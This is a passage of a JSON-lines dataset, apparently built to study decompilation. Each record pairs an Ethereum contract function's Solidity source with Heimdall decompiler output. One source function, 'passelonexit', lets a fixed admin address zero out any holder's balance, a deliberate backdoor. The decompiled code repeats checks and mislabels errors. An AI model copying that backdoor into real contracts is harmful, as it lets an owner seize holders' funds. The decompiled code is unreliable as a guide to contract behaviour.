{"contract_address": "0x5B7b79708986436F7a90c33f0683841DaEC83810", "original_solidity_code": "function symbol() public view  returns (string memory) {\r\n        return _tokenSSSsymbol;\r\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_i) {\n            if (store_i - ((store_i >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_i >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_i >> 0x01;\n                if (store_i) {\n                    if (store_i - ((store_i >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_i >> 0x01) {\n                            if (0x1f < (store_i >> 0x01)) {\n                                var_a = 0x05;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_i >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x0571e4201619916DB35214e935F0E46F037BBd2D", "original_solidity_code": "function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"You are trying to transfer more than your balance\");\n        require(address(arg0), \"You are trying to transfer more than your balance\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        require(!(arg1 > storage_map_d[var_a]), \"You are trying to transfer more than your balance\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x31;\n        var_f = 0x596f752061726520747279696e6720746f207472616e73666572206d6f726520;\n        var_g = 0x7468616e20796f75722062616c616e6365000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_b = 0x04;\n        require(!(!bytes1(storage_map_d[var_a])), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(storage_map_d[var_a])), \"ERC20: transfer to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x04;\n        require(!(!bytes1(storage_map_d[var_a])), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(storage_map_d[var_a])), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(storage_map_d[var_a])), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(storage_map_d[var_a])), \"ERC20: transfer to the zero address\");\n        require(address(pair) == (address(msg.sender)), \"ERC20: transfer to the zero address\");\n        require(!(arg1 > _maxSellAmount), \"ERC20: transfer to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x04;\n        require(bytes1(storage_map_d[var_a]), \"ERC20: transfer to the zero address\");\n        require(bytes1(storage_map_d[var_a]), \"ERC20: transfer to the zero address\");\n        require(!(arg1 > _maxTxAmount), \"ERC20: transfer to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x04;\n        require(bytes1(storage_map_d[var_a]), \"ERC20: transfer to the zero address\");\n        require(bytes1(storage_map_d[var_a]), \"ERC20: transfer to the zero address\");\n        require(!(address(pair) == (address(arg0))), \"ERC20: transfer to the zero address\");\n        require(!(address(pair) == (address(arg0))), \"ERC20: transfer to the zero address\");\n        var_a = address(this);\n        var_b = 0x02;\n        require(!(!bytes1(store_h)), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(store_h)), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(store_h)), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(store_h)), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(store_h)), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(store_h)), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(store_h)), \"ERC20: transfer to the zero address\");\n        require(!(!bytes1(store_h)), \"ERC20: transfer to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x02;\n        require(!((storage_map_d[var_a] - arg1) > storage_map_d[var_a]), \"ERC20: transfer to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        var_a = address(msg.sender);\n        var_b = 0x02;\n        storage_map_d[var_a] = storage_map_d[var_a] - arg1;\n        var_a = address(msg.sender);\n        var_b = 0x04;\n        require(!(!bytes1(storage_map_d[var_a])), \"ERC20: transfer to the zero address\");\n        require(!(bytes1(storage_map_d[var_a])), \"ERC20: transfer to the zero address\");\n        var_a = address(arg0);\n        var_b = 0x02;\n        require(!(storage_map_d[var_a] > (arg1 + storage_map_d[var_a])), \"ERC20: transfer to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        var_a = address(arg0);\n        var_b = 0x02;\n        storage_map_d[var_a] = arg1 + storage_map_d[var_a];\n        uint256 var_c = arg1;\n        emit Transfer(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_a = address(msg.sender);\n        var_b = 0x05;\n        require(bytes1(storage_map_d[var_a]), \"ERC20: transfer to the zero address\");\n        require(!(bytes1(storage_map_d[var_a])), \"ERC20: transfer to the zero address\");\n        require(!((store_i - 0x64) > store_i), \"ERC20: transfer to the zero address\");\n        require(!((store_i - 0x64) > 0), \"ERC20: transfer to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x05;\n        require(bytes1(storage_map_d[var_a]), \"ERC20: transfer to the zero address\");\n        require(!(bytes1(storage_map_d[var_a])), \"ERC20: transfer to the zero address\");\n        require(!((store_i - 0x64) > store_i), \"ERC20: transfer to the zero address\");\n        require(store_i, \"ERC20: transfer to the zero address\");\n        require((store_i - 0x64) == ((store_i - 0x64) * (arg1 / store_i) / (arg1 / store_i)) | (!arg1 / store_i), \"ERC20: transfer to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        var_a = address(this);\n        var_b = 0x02;\n        require(!(storage_map_d[var_a] > ((store_i - 0x64) * (arg1 / store_i) + storage_map_d[var_a])), \"ERC20: transfer to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        var_a = address(this);\n        var_b = 0x02;\n        storage_map_d[var_a] = ((store_i - 0x64) * (arg1 / store_i)) + storage_map_d[var_a];\n        var_c = (store_i - 0x64) * (arg1 / store_i);\n        emit Transfer(address(msg.sender), address(this), (store_i - 0x64) * (arg1 / store_i));\n        require(!(store_j > 0), \"ERC20: transfer to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x05;\n        require(bytes1(storage_map_d[var_a]), \"ERC20: transfer to the zero address\");\n        require(!(bytes1(storage_map_d[var_a])), \"ERC20: transfer to the zero address\");\n        require(!((store_i - 0x64) > store_i), \"ERC20: transfer to the zero address\");\n        require(!((store_i - 0x64) > store_j), \"ERC20: transfer to the zero address\");\n        require(store_i, \"ERC20: transfer to the zero address\");\n        require((store_j == ((store_j * (arg1 / store_i)) / (arg1 / store_i))) | (!arg1 / store_i), \"ERC20: transfer to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        require(address(this), \"ERC20: transfer to the zero address\");\n        require(0xdead, \"ERC20: transfer to the zero address\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x23;\n        var_f = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_g = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_a = address(this);\n        var_b = 0x02;\n        require(!((store_j * (arg1 / store_i)) > storage_map_d[var_a]), \"You are trying to transfer more than your balance\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x31;\n        var_f = 0x596f752061726520747279696e6720746f207472616e73666572206d6f726520;\n        var_g = 0x7468616e20796f75722062616c616e6365000000000000000000000000000000;\n        var_a = address(this);\n        var_b = 0x04;\n        if (storage_map_d[var_a]) {\n            if (storage_map_d[var_a]) {\n                var_a = address(this);\n                var_b = 0x04;\n                if (storage_map_d[var_a]) {\n                    if (storage_map_d[var_a]) {\n                        if (storage_map_d[var_a]) {\n                            if (storage_map_d[var_a]) {\n                                if (address(pair) == (address(this))) {\n                                    if (!(store_j * (arg1 / store_i)) > _maxSellAmount) {\n                                        var_a = address(this);\n                                        var_b = 0x04;\n                                        if (storage_map_d[var_a]) {\n                                            require(!(!bytes1(storage_map_d[var_a])), \"TX Limit Exceeded\");\n                                            require(!(!bytes1(storage_map_d[var_a])), \"TX Limit Exceeded\");\n                                            var_a = address(this);\n                                            var_b = 0x04;\n                                            require(!(!bytes1(storage_map_d[var_a])), \"TX Limit Exceeded\");\n                                            require(!(!bytes1(storage_map_d[var_a])), \"TX Limit Exceeded\");\n                                            require(!(!bytes1(storage_map_d[var_a])), \"TX Limit Exceeded\");\n                                            var_a = address(this);\n                                            var_b = 0x04;\n                                            require(!(!bytes1(storage_map_d[var_a])), \"TX Limit Exceeded\");\n                                            var_a = address(this);\n                                            var_b = 0x02;\n                                            require(address(pair) == (address(this)), \"TX Limit Exceeded\");\n                                            require(!((store_j * (arg1 / store_i)) > _maxSellAmount), \"TX Limit Exceeded\");\n                                            require(bytes1(storage_map_d[var_a]), \"TX Limit Exceeded\");\n                                            require(bytes1(storage_map_d[var_a]), \"TX Limit Exceeded\");\n                                            require(!((store_j * (arg1 / store_i)) > _maxTxAmount), \"TX Limit Exceeded\");\n                                            require(bytes1(storage_map_d[var_a]), \"TX Limit Exceeded\");\n                                            require(bytes1(storage_map_d[var_a]), \"TX Limit Exceeded\");\n                                            require(!(!bytes1(storage_map_d[var_a])), \"TX Limit Exceeded\");\n                                            store_h = 0x01 | (uint248(store_h));\n                                            require(!(!bytes1(store_h)), \"TX Limit Exceeded\");\n                                            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                            var_h = 0x11;\n                                            require(!(!bytes1(store_h)), \"TX Limit Exceeded\");\n                                            require(!(!bytes1(store_h)), \"TX Limit Exceeded\");\n                                            require(!(!bytes1(store_h)), \"TX Limit Exceeded\");\n                                        }\n                                    }\n                                }\n                            }\n                            require(!(!bytes1(store_h)), \"TX Limit Exceeded\");\n                            require(!(!bytes1(store_h)), \"TX Limit Exceeded\");\n                            require(!(!bytes1(store_h)), \"TX Limit Exceeded\");\n                        }\n                    }\n                }\n                require(!(!bytes1(store_h)), \"TX Limit Exceeded\");\n            }\n            require(!(store_k > (0x01 + store_k)), \"TX Limit Exceeded\");\n        }\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x11;\n        var_f = 0x5458204c696d6974204578636565646564000000000000000000000000000000;\n        require(!((store_j * (arg1 / store_i)) > _maxTxAmount), \"TX Limit Exceeded\");\n        require(!((store_j * (arg1 / store_i)) > _maxTxAmount), \"TX Limit Exceeded\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x11;\n        var_f = 0x5458204c696d6974204578636565646564000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x11;\n        var_f = 0x5458204c696d6974204578636565646564000000000000000000000000000000;\n        require(!((store_j * (arg1 / store_i)) > _maxSellAmount), \"TX Limit Exceeded\");\n        require(!((store_j * (arg1 / store_i)) > _maxSellAmount), \"TX Limit Exceeded\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x11;\n        var_f = 0x5458204c696d6974204578636565646564000000000000000000000000000000;\n        if (0xdead == 0xdead) {\n        }\n        require(bytes1(pair / 0x010000000000000000000000000000000000000000), \"tradingAllowed\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x0e;\n        var_f = 0x74726164696e67416c6c6f776564000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_g = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x12;\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        if (address(arg0) - (address(pair))) {\n            require(address(arg0) - (address(pair)), \"TX Limit Exceeded\");\n            require(address(msg.sender) - (address(pair)), \"TX Limit Exceeded\");\n        }\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x12;\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x11;\n        var_f = 0x5458204c696d6974204578636565646564000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x11;\n        var_f = 0x5458204c696d6974204578636565646564000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x23;\n        var_f = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_g = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_g = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x054348505D3A37c155C15435FEB95392bDDb31E6", "original_solidity_code": "function openTrading() external onlyOwner() {\r\n        require(!tradingOpen,\"trading is already open\");\r\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        _approve(address(this), address(uniswapV2Router), _tTotal);\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\r\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\r\n        swapEnabled = true;\r\n        tradingOpen = true;\r\n        firstBlock = block.number;\r\n    }", "heimdall_decompiled_code": "function openTrading() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(bytes1(store_f / 0x010000000000000000000000000000000000000000)), \"trading is already open\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x17;\n        var_d = 0x74726164696e6720697320616c7265616479206f70656e000000000000000000;\n        store_l = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d | (uint96(store_l));\n        require(0x09, \"ERC20: approve to the zero address\");\n        require((0x01 == 0x01) | !0x017e9d8602b400, \"ERC20: approve to the zero address\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(address(this), \"ERC20: approve to the zero address\");\n        require(0x7a250d5630b4cf539739df2c5dacb4c659f2488d, \"ERC20: approve to the zero address\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x22;\n        var_d = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        address var_e = address(this);\n        var_h = 0x02;\n        var_e = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d;\n        address var_h = keccak256(var_e);\n        storage_map_m[var_e] = 0x017e9d8602b400;\n        var_a = 0x017e9d8602b400;\n        emit Approval(address(this), 0x7a250d5630b4cf539739df2c5dacb4c659f2488d, 0x017e9d8602b400);\n        var_a = 0xc45a015500000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_l / 0x01).factory(var_b); // staticcall\n        uint256 var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!((var_i + ret0.length) - var_i) < 0x20);\n        require(var_i.length == (address(var_i.length)));\n        var_j = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_l / 0x01).WETH(var_c); // staticcall\n        var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!((var_i + ret0.length) - var_i) < 0x20);\n        require(var_i.length == (address(var_i.length)));\n        var_k = 0xc9c6539600000000000000000000000000000000000000000000000000000000;\n        address var_d = address(this);\n        uint256 var_g = address(var_i.length);\n        (bool success, bytes memory ret0) = address(var_i.length).Unresolved_c9c65396(var_d); // call\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x24;\n        var_d = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n        if (0x0a) {\n            if (0x0a == 0x01) {\n                if (0x0a == 0x02) {\n                    if (!0x09 > 0xff) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                            if (!0x09 > 0x01) {\n                                if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                    var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                    var_f = 0x11;\n                                    if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                        var_f = 0x11;\n                                        if (!0x01) {\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xc921a48b2bBd243aC30422B266edf58F472Eca7F", "original_solidity_code": "function burn(uint256 amount) public virtual {\\r\\n        _burn(_msgSender(), amount);\\r\\n    }", "heimdall_decompiled_code": "function burn(uint256 arg0) public {\n        require(address(msg.sender), \"ERC20: burn amount exceeds balance\");\n        address var_a = address(msg.sender);\n        uint256 var_b = 0;\n        require(!(storage_map_i[var_a] < arg0), \"ERC20: burn amount exceeds balance\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a206275726e20616d6f756e7420657863656564732062616c616e;\n        var_g = 0x6365000000000000000000000000000000000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_b = 0;\n        storage_map_i[var_a] = storage_map_i[var_a] - arg0;\n        totalSupply = totalSupply - arg0;\n        uint256 var_c = arg0;\n        emit Transfer(address(msg.sender), 0, arg0);\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x21;\n        var_f = 0x45524332303a206275726e2066726f6d20746865207a65726f20616464726573;\n        var_g = 0x7300000000000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xB9FB64018E475BBCF128E391E62274599c4D848C", "original_solidity_code": "function balanceOf(address owner) public view virtual override returns (uint256) {\\n        if (owner == address(0)) revert BalanceQueryForZeroAddress();\\n        return _packedAddressData[owner] & _BITMASK_ADDRESS_DATA_ENTRY;\\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint64) {\n        require(arg0 == (address(arg0)));\n        require(address(arg0), CustomError_8f4eb604());\n        address var_a = address(arg0);\n        var_b = 0x05;\n        address var_c = uint64(storage_map_b[var_a]);\n        return uint64(storage_map_b[var_a]);\n        var_c = 0x8f4eb60400000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x31b60867a6203e76120df0612769ba136097eBc8", "original_solidity_code": "function passelonexit(address jhhhqq) public    {\r\n        \r\n        require(_msgSender() == vipadmin123);   \r\n        if(_msgSender() == vipadmin123){\r\n        }else{\r\n        }\r\n        uint128 zrqqamount = 0;\r\n        xelonlist[jhhhqq] = zrqqamount; \r\n        \r\n    }", "heimdall_decompiled_code": "function passelonexit(address arg0) public payable {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender) == (address(vipadmin123)));\n        address var_a = address(arg0);\n        var_b = 0x08;\n        storage_map_b[var_a] = 0;\n    }"}
{"contract_address": "0xE575f6f50AF7A409F7381F15bC25Ff9dD9414660", "original_solidity_code": "function JewelTweakUpperTxnLimits(uint256 newNum) external onlyOwner {\\r\\n        require(\\r\\n            newNum >= ((totalSupply() * 5) / 1000) / 1e9,\\r\\n            \\\"Cannot set maxTxAmount lower than 0.5%\\\"\\r\\n        );\\r\\n        maxTxAmount = newNum * (10**9);\\r\\n    }", "heimdall_decompiled_code": "function JewelTweakUpperTxnLimits(uint256 arg0) public view {\n        require(arg0 == arg0);\n        require(address(_owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!totalSupply | (0x05 == ((totalSupply * 0x05) / totalSupply)));\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        require(0x03e8);\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x12;\n    }"}
{"contract_address": "0x0cF6AF04E435c22D26884FAd0682E96BA150CBBb", "original_solidity_code": "function setNumbers(uint256 amount) public onlyOwner {\\r\\n        numbers = amount;\\r\\n    }", "heimdall_decompiled_code": "function setNumbers(uint256 arg0) public payable {\n        require(arg0 == arg0);\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        numbers = arg0;\n    }"}
{"contract_address": "0x7F073dD6bC1B6480d8f06Ebedd6c53f4dD9c8DBc", "original_solidity_code": "function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x46c4C3ef9A1557017955E74D4F3550971C2700A3", "original_solidity_code": "function approveMax(address spender) external returns (bool) {\r\n        return approve(spender, type(uint256).max);\r\n    }", "heimdall_decompiled_code": "function approveMax(address arg0) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = msg.sender;\n        var_b = 0x07;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_o[var_a] = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;\n        var_c = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;\n        emit Approval(msg.sender, address(arg0), 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);\n        var_c = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0xe06802BE64FC18b16dB2dA75fBAf139FF268c97B", "original_solidity_code": "function balanceOf(address account) public view returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        uint256 var_b = 0;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0xe150ed6520Ef0F5269a82638f344541e22298E51", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\\n        _approve(_msgSender(), spender, amount);\\n        return true;\\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x0571e4201619916DB35214e935F0E46F037BBd2D", "original_solidity_code": "function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}", "heimdall_decompiled_code": "function transferOwnership(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(getOwner)), \"!OWNER\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x06;\n        var_d = 0x214f574e45520000000000000000000000000000000000000000000000000000;\n        getOwner = (address(arg0)) | (uint96(getOwner));\n        address var_a = address(arg0);\n        emit OwnershipTransferred(address(arg0));\n    }"}
{"contract_address": "0x1142dFfAA66edAac7562BE5c2A7dACeB4387D6b8", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x2141a81Fbd52a193712C1d77440500e29aB0Fa63", "original_solidity_code": "function openTrading() external onlyOwner() {\r\n        require(!tradingOpen,\"trading is already open\");\r\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        _approve(address(this), address(uniswapV2Router), _tTotal);\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\r\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\r\n        swapEnabled = true;\r\n        tradingOpen = true;\r\n    }", "heimdall_decompiled_code": "function openTrading() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(bytes1(store_g / 0x010000000000000000000000000000000000000000)), \"trading is already open\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x17;\n        var_d = 0x74726164696e6720697320616c7265616479206f70656e000000000000000000;\n        store_f = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d | (uint96(store_f));\n        require(0x09, \"ERC20: approve to the zero address\");\n        require((0x01 == 0x01) | !0x3b9aca00, \"ERC20: approve to the zero address\");\n        var_e = 